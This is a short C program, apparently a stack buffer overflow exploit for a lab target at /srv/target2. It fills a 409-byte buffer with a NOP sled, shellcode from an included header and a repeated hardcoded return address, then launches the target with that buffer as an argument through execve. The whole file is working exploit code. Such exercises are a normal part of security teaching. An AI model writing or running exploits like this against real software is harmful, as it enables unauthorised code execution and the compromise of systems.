#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define T "/srv/target2"
const int S=409,O=201;const uint32_t R=0xffffdb5c;
void f(char*b){memset(b,0x90,S-1);memcpy(b+O,shellcode,sizeof(shellcode)-1);
for(int i=O+sizeof(shellcode)-1;i<S-1;i+=4)*(uint32_t*)(b+i)=R;b[S-1]=0;}
int main(void){char*a[4],*e[1],b[S];f(b);a[0]=T;a[1]=b;a[2]="65935";
a[3]=NULL;e[0]=NULL;execve(T,a,e);fprintf(stderr,"execve failed.\n");return 0;}